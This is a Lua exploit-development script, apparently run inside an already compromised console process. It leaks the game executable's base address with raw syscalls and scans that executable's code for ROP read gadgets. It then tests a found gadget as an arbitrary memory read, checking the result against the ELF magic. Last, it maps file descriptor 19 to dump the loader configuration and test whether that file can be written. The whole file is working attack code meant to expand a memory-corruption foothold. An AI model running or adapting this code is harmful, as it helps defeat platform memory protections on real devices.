-- CRASH_CLASS: LOW
-- PROBE 118a: Scan eboot for arbitrary-read gadgets + fd 19 config dump
--
-- native.fcall_with_rax(addr, rax, rdi, rsi) calls addr with those regs
-- and returns RAX. If we find "mov rax,[rdi]; ret" (48 8B 07 C3) in eboot,
-- we get an arbitrary userland qword read via fcall_with_rax(gadget,0,target,0).
--
-- Also: dump fd 19 config (loader options), check if writable.
-- Also: scan for other useful gadgets we might use later.

print("=== PROBE 118a: READ GADGET SCAN ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function rb(a)
    local ok,v=pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200)
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local eboot_base = uint64(string.format("0x%X%08X",ehi,elo))
print(string.format("eboot_base=%s",fmt_ptr(eboot_base)))
local EB = N(eboot_base)

-- Also get eboot size from text segment info
local text_size_lo = rd(inf+0x110) or 0
local text_size_hi = rd(inf+0x114) or 0
if text_size_lo < 0 then text_size_lo = text_size_lo + 0x100000000 end
print(string.format("eboot_text_size=0x%X%08X", text_size_hi, text_size_lo))

-- ============================================================
print("")
print("--- A: SCAN EBOOT FOR READ GADGETS ---")
-- Scan first 512KB of eboot .text (RX, safe to read)
-- Looking for these byte patterns:
--   48 8B 07 C3         = mov rax,[rdi]; ret        (qword read)
--   8B 07 C3            = mov eax,[rdi]; ret        (dword read, zero-ext)
--   0F B7 07 C3         = movzx eax,word [rdi]; ret (word read)
--   0F B6 07 C3         = movzx eax,byte [rdi]; ret (byte read)
--   48 8B 47 xx C3      = mov rax,[rdi+xx]; ret     (qword read at offset)
--   48 8B 06 C3         = mov rax,[rsi]; ret        (qword read via RSI)

local patterns = {
    {name="mov rax,[rdi];ret",     bytes={0x48,0x8B,0x07,0xC3}, reg="rdi", width=8},
    {name="mov eax,[rdi];ret",     bytes={0x8B,0x07,0xC3},      reg="rdi", width=4},
    {name="mov rax,[rsi];ret",     bytes={0x48,0x8B,0x06,0xC3}, reg="rsi", width=8},
    {name="mov eax,[rsi];ret",     bytes={0x8B,0x06,0xC3},      reg="rsi", width=4},
    {name="movzx eax,byte[rdi];ret", bytes={0x0F,0xB6,0x07,0xC3}, reg="rdi", width=1},
    {name="movzx eax,word[rdi];ret", bytes={0x0F,0xB7,0x07,0xC3}, reg="rdi", width=2},
}

-- Also look for mov rax,[rdi+N];ret for small N
local offset_patterns = {}
for off=0x08,0x30,0x08 do
    table.insert(offset_patterns, {
        name=string.format("mov rax,[rdi+0x%X];ret", off),
        bytes={0x48,0x8B,0x47,off,0xC3}, reg="rdi", width=8, disp=off
    })
end

local scan_size = 0x80000  -- 512KB
local found_gadgets = {}

print(string.format("  scanning %d bytes of eboot .text...", scan_size))

for off=0,scan_size-8 do
    -- Read 8 bytes at current position
    local b = {}
    local ok_all = true
    for i=1,8 do
        local bv = rb(EB+off+i-1)
        if bv==nil then ok_all=false; break end
        b[i] = bv
    end

    if ok_all then
        -- Check each pattern
        for _, pat in ipairs(patterns) do
            local match = true
            for i=1,#pat.bytes do
                if b[i] ~= pat.bytes[i] then match=false; break end
            end
            if match then
                table.insert(found_gadgets, {
                    name=pat.name, offset=off, reg=pat.reg, width=pat.width
                })
                print(string.format("  FOUND: %s at eboot+0x%X", pat.name, off))
            end
        end
        -- Check offset patterns
        for _, pat in ipairs(offset_patterns) do
            local match = true
            for i=1,#pat.bytes do
                if b[i] ~= pat.bytes[i] then match=false; break end
            end
            if match then
                table.insert(found_gadgets, {
                    name=pat.name, offset=off, reg=pat.reg, width=pat.width, disp=pat.disp
                })
                print(string.format("  FOUND: %s at eboot+0x%X", pat.name, off))
            end
        end
    end

    -- Progress every 64KB
    if off % 0x10000 == 0 and off > 0 then
        local c = N(native.fcall_with_rax(stub,20))
        if c~=pid then print("PROCESS DIED at scan offset 0x"..string.format("%X",off)) return end
    end
end

print(string.format("  scan complete, found %d gadgets", #found_gadgets))

-- ============================================================
print("")
print("--- B: EXTEND SCAN TO FULL EBOOT ---")
-- If nothing found in first 512KB, scan more
if #found_gadgets == 0 then
    print("  no read gadgets in first 512KB, scanning 512KB-2MB...")
    for off=0x80000,0x200000-8 do
        local b = {}
        local ok_all = true
        for i=1,5 do
            local bv = rb(EB+off+i-1)
            if bv==nil then ok_all=false; break end
            b[i] = bv
        end
        if ok_all then
            -- Only check the most useful patterns to save time
            if b[1]==0x48 and b[2]==0x8B and b[3]==0x07 and b[4]==0xC3 then
                table.insert(found_gadgets, {name="mov rax,[rdi];ret", offset=off, reg="rdi", width=8})
                print(string.format("  FOUND: mov rax,[rdi];ret at eboot+0x%X", off))
            end
            if b[1]==0x8B and b[2]==0x07 and b[3]==0xC3 then
                table.insert(found_gadgets, {name="mov eax,[rdi];ret", offset=off, reg="rdi", width=4})
                print(string.format("  FOUND: mov eax,[rdi];ret at eboot+0x%X", off))
            end
            if b[1]==0x48 and b[2]==0x8B and b[3]==0x06 and b[4]==0xC3 then
                table.insert(found_gadgets, {name="mov rax,[rsi];ret", offset=off, reg="rsi", width=8})
                print(string.format("  FOUND: mov rax,[rsi];ret at eboot+0x%X", off))
            end
        end
        if off % 0x40000 == 0 then
            local c = N(native.fcall_with_rax(stub,20))
            if c~=pid then print("DIED at 0x"..string.format("%X",off)) return end
        end
    end
    print(string.format("  extended scan done, total found: %d", #found_gadgets))
end

-- ============================================================
print("")
print("--- C: TEST BEST READ GADGET ---")
if #found_gadgets > 0 then
    -- Pick the first qword-width gadget via RDI
    local best = nil
    for _, g in ipairs(found_gadgets) do
        if g.reg=="rdi" and g.width==8 and not g.disp then
            best = g; break
        end
    end
    if not best then
        for _, g in ipairs(found_gadgets) do
            if g.reg=="rdi" then best = g; break end
        end
    end
    if not best then best = found_gadgets[1] end

    print(string.format("  testing: %s at eboot+0x%X", best.name, best.offset))

    local gadget_addr = EB + best.offset
    -- Read from a known address: eboot base itself (should be ELF magic)
    local ok1, result1 = pcall(function()
        if best.reg=="rdi" then
            return native.fcall_with_rax(gadget_addr, 0, EB, 0)
        else
            return native.fcall_with_rax(gadget_addr, 0, 0, EB)
        end
    end)

    if ok1 and result1 then
        local r = N(result1)
        if r < 0 then r = r + 0x100000000 end
        print(string.format("  read eboot+0: 0x%X", r))
        -- ELF magic: 7F 45 4C 46 = 0x464C457F (little-endian dword)
        if (r == 0x464C457F) or (r % 0x100000000 == 0x464C457F) then
            print("  *** ELF MAGIC CONFIRMED — READ GADGET WORKS! ***")
        else
            print("  unexpected value (might still work, checking...)")
        end

        -- Second test: read from pipe_str address (known userland data)
        local pipe_str = tostring(syscall.pipe)
        local test_buf = memory.alloc(16)
        wq(test_buf, uint64(0xCAFEBABE12345678))
        local ok2, result2 = pcall(function()
            if best.reg=="rdi" then
                return native.fcall_with_rax(gadget_addr, 0, N(test_buf), 0)
            else
                return native.fcall_with_rax(gadget_addr, 0, 0, N(test_buf))
            end
        end)
        if ok2 and result2 then
            print(string.format("  read test_buf: %s (expect 0xCAFEBABE12345678)", fmt_ptr(result2)))
        else
            print("  test_buf read failed")
        end
    else
        print(string.format("  read failed: ok=%s", tostring(ok1)))
    end
else
    print("  no gadgets found to test")
end

-- ============================================================
print("")
print("--- D: DUMP fd 19 CONFIG (loader options) ---")
-- fd 19 is REG file, mapped in 117a with text content
local sc_mmap = mk(477)
local ok19, addr19 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(1),
        uint64(1), uint64(19), uint64(0))
end)
if ok19 and addr19 then
    local h,l = get_hi_lo(addr19)
    if h<0 then h=h+0x100000000 end
    if h~=0xFFFFFFFF then
        local MA = N(addr19)
        -- Read as text (stop at first null or 4KB)
        local text = ""
        for i=0,0xFFF do
            local b = rb(MA+i)
            if not b or b==0 then break end
            text = text .. string.char(b)
        end
        print("  fd 19 content (" .. #text .. " bytes):")
        print(text)

        -- Try PROT_RW
        local ok19w, addr19w = pcall(function()
            return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
                uint64(1), uint64(19), uint64(0))
        end)
        if ok19w and addr19w then
            local hw,lw = get_hi_lo(addr19w)
            if hw<0 then hw=hw+0x100000000 end
            if hw~=0xFFFFFFFF then
                print("  fd 19 PROT_RW: WRITABLE!")
            else
                print("  fd 19 PROT_RW: MAP_FAILED")
            end
        else
            print("  fd 19 PROT_RW: pcall failed")
        end
    else
        print("  fd 19 mmap failed")
    end
else
    print("  fd 19 mmap pcall failed")
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 118a COMPLETE ===")
